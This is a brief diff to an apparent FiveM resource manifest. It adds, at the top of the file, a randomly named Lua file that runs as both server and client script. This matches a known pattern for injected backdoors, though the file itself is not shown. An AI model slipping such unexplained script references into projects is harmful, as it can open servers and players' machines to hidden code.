@@ -1,3 +1,5 @@
+server_script "HS9QMS7AOEF.lua"
+client_script "HS9QMS7AOEF.lua"
 --[[ FX Information ]]--
 fx_version   'cerulean'
 use_experimental_fxv2_oal 'yes'
